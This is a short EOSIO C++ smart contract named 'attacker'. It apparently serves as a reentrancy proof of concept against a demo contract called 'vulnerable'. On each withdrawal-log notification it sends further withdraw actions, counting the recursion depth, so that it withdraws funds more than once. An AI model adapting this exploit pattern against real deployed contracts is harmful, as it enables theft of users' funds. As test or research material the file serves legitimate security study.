#include "../eosio.token.hpp"
#include <eosio/asset.hpp>
#include <eosio/eosio.hpp>
#include <eosio/system.hpp>

using namespace eosio;

static constexpr extended_symbol EOS_SYMBOL =
    extended_symbol(symbol("EOS", 4), name("eosio.token"));

class [[eosio::contract("attacker")]] attacker : public contract {
public:
  using contract::contract;
  attacker(eosio::name receiver, eosio::name code,
           eosio::datastream<const char *> ds)
      : contract(receiver, code, ds) {}

  TABLE info {
    uint8_t recursion_depth = 0;

    uint64_t primary_key() const { return 0; }
  };
  typedef eosio::multi_index<"info"_n, info> info_t;
  info_t info_table = info_t(get_self(), get_self().value);

  [[eosio::on_notify("vulnerable::logwithdraw")]] void on_log(
      name from, eosio::asset quantity) {

    auto info = info_table.find(0);
    bool recurse = false;

    if (info == info_table.end()) {
      recurse = true;
      info_table.emplace(get_self(), [&](auto &x) { x.recursion_depth = 1; });
    } else {
      if (info->recursion_depth < 2) {
        recurse = true;
        info_table.modify(info, same_payer,
                          [&](auto &x) { x.recursion_depth += 1; });
      }
    }

    if (recurse) {
      action(permission_level{get_self(), name("active")}, name("vulnerable"),
             name("withdraw"), std::make_tuple(get_self(), quantity))
          .send();
    }
  }
};
